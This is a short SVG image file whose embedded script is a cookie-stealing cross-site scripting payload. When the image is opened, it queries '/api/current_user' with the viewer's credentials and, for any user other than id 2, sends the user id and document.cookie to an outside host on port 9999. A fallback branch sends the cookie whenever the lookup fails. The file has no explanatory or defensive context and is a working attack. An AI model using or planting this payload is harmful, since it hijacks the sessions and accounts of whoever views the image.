<svg xmlns="http://www.w3.org/2000/svg">
<script>
<![CDATA[

  fetch('/api/current_user', {credentials: 'include'})
    .then(r => r.json())
    .then(user => {
      if(user.id !== 2) { 
        new Image().src = '<IP>:9999/admin_cookie?user=' + 
                         user.id + '&cookie=' + encodeURIComponent(document.cookie);
      }
    })
    .catch(() => {

      new Image().src = '<IP>:9999/fallback?c=' + encodeURIComponent(document.cookie);
    });
]]>
</script>
</svg>